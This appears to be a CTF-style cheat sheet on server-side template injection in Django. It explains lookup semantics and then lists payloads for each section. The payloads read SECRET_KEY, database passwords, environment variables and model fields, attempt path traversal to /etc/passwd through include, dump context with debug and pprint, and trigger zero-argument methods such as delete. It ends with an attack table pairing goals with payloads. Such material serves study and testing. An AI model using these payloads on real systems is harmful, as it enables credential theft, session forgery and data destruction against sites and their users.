# Django templates — logic-less but not harmless

Django's engine deliberately has no expression eval — `{{x}}` is
attribute-lookup only. That's WHY people think it's safe — and
why `{% include %}`, `{% with %}`, debug-mode and custom
filter/tag libraries still leak. The SSTI ceiling is lower; the
findings are different.

---

## 1. The lookup semantics — what `{{x}}` actually does

```text
{{x}}        → variable lookup → __getitem__ → __dict__/attr → call?
{{x.y}}      → x['y'] then x.y — attr then item both tried
{{x.0}}      → x[0] — numeric index
{{x()}}      → NO — parens illegal in Django templates
{{x.method}} → calls method IF it takes no args! — auto-call!
```

`{{x.method}}` — Django AUTO-CALLS zero-arg methods during lookup!
`{{x.delete}}` would RUN `x.delete()`. That's how `{{user.get_full_name}}`
works — and how `{{obj.dangerous_method}}` executes. The lookup
order: dict-key → attribute → numeric-index → call-if-no-arg.

## 2. The dangerous auto-callables

```django
{{user.delete}}                    — if bound — DESTRUCTIVE — don't
{{obj.save}}                       — model save — side-effects
{{obj.get_secret}}                  — custom getters — the point
{{obj.__class__}}                   — class object render
{{obj.__dict__}}                    — instance attrs — LEAKS FIELDS
{{obj._meta}}                       — model meta — field inventory
{{user.password}}                   — the hash/field — auth secrets
{{user.email}}
{{user.is_superuser}}
{{settings.SECRET_KEY}}              — if settings bound — jackpot
{{settings.DATABASES}}
{{request.META}}                    — environ-dict — env leak
{{request.session}}
{{request.user}}
{{csrf_token}}
{{messages}}
{{perms}}
```

`{{obj.__dict__}}` — dumps every instance attribute — flag-fields
inside models leak through the dict-render.

## 3. `{% include %}` — the real weapon

```django
{% include x %}              — x from input → template-file inclusion
{% include '/flag' %}        — loader path-reach — template-format
{% include request.GET.t %} — dynamic — input-named template
{% include '../../etc/passwd' %}  — traversal — loader-bounded
{% include 'flag.txt' %}      — non-template file — loader may serve
{% include 'admin/panel.html' %}  — render privileged template
```

`{% include name %}` → the template-loader reads `name` — files
outside template-dirs error, files INSIDE render (with their own
`{{}}` — double-injection), and `../` traversal depends on the
loader (filesystem loader vs cached vs app_dirs).

## 4. `{% extends %}` / `{% load %}` / `{% with %}`

```django
{% extends x %}              — parent-template from input — same as include
{% load custom_tags %}       — load a tag-LIBRARY by name!
   {% load os %}              — tries to import 'os' as tag-lib → err
   {% load myapp.dangerous %} — app tag-libs → their custom tags run
{% with x=7*7 %}{{x}}{% endwith %}   — set — arithmetic allowed?
{% with x=y %}{{x}}{% endwith %}
{% now 'Y' %}                — current year — harmless probe
{% cycle %} {% firstof %}    — builtins
{% url %} {% static %}       — url-reverse — app-inventory leak
```

`{% load x %}` — imports a templatetags module — if the app has a
dangerous custom tag-lib, loading it brings its tags in scope.

## 5. The filter-injection — `|filter:"arg"`

```django
{{x|safe}}               — marks safe — x's HTML renders —
                          xss-adjacent
{{x|default:y}}           — fallback — y also resolves
{{x|first}} {{x|last}} {{x|length}}
{{x|join}}
{{x|dictsort}}
{{x|filesizeformat}}
{{x|date}}
{{x|truncatechars}}
{{x|linebreaks}}
{{x|escapejs}}           — for js-context
{{x|urlencode}}
{{x|wordwrap}}
{{x|pprint}}             — pretty-print — object-dump!
{{x|debug}}              — if debug-tag exists
{{x|json_script}}        — embeds as JSON
{{x|get_digit}}
{{settings|pprint}}       — pprint the settings — full dump!
```

`|pprint` — pretty-prints the object — `{{settings|pprint}}`
dumps the whole settings module — a config-leak in one filter.

## 6. The settings-object — usually not bound, sometimes

```django
{{settings}}               — bound only if app added it to context
{{settings.SECRET_KEY}}     — session-forge key!
{{settings.DATABASES.default.PASSWORD}} — db creds
{{settings.DEBUG}}          — debug state
{{settings.FLAG}}
```

`settings` must be in the context — but `{{request.META}}` gives
os.environ — env-vars. And `{{obj._state}}`/`{{obj._meta}}` leak
model internals.

## 7. The `{% verbatim %}` / `{% csrf_token %}` tells

```django
{% verbatim %}{{x}}{% endverbatim %}   — renders literal — no eval
{% csrf_token %}                        — embeds the token —
                                         evidence the csrf-context
{% now %}                               — engine alive — output
                                         proves parse
{% lorem %}                             — lorem-text — jinja-like helper
{% debug %}                             — if django-debug bound —
                                         dumps context!
```

`{% debug %}` — context-dump builtin (when bound) — the whole
context table in one tag.

## 8. Custom-tag exploitation — the app's own tags

```django
{% mytag arg %}              — custom tags from {% load %} —
                              THEIR behavior — check the lib
{% get_flag %}               — if the app registered a flag-tag
{% show_secrets %}
{% include x %} {% ssi %}    — {% ssi %} = server-side-include —
                              REMOVED in modern django — old apps
{% load myapp.extras %}
   {% eval 'code' %}         — if someone wrote an eval-tag
```

`{% ssi %}` — the removed server-side-include tag — read arbitrary
files by path — removed in Django ≥1.8 for exactly this reason —
legacy apps may have it.

## 9. The debug-page leak — no SSTI needed

```python
DEBUG=True + exception → the django debug page dumps:
  - full settings (with secrets masked? — depends)
  - the request META (env!)
  - the stack locals — flag-vars in scope leak!
```

A crash in DEBUG mode → the yellow page shows every local var at
every stack-frame — `settings`/`env`/locals all visible — no SSTI
needed, just force `1/0` somewhere.

## 10. The bounded-attack table

| Want | Path |
|---|---|
| Env vars | `{{request.META}}` → environ keys |
| App config | `{{settings}}` if bound → `|pprint` |
| Model secrets | `{{obj.__dict__}}` `{{obj.field}}` |
| File read | `{% include path %}` — loader-bounded |
| Template-traversal | `{% include '../x' %}` |
| Custom-tags | `{% load app.tags %}` then their tags |
| Context-dump | `{% debug %}` (if bound) / `{{obj|pprint}}` |
| Auto-call | `{{obj.dangerous}}` — zero-arg methods RUN |

Django SSTI is a READ/leak primitive — no exec — but `__dict__`,
`settings`, `{% include %}`, auto-call, and debug-pages leak
enough for most CTF flag-shapes.
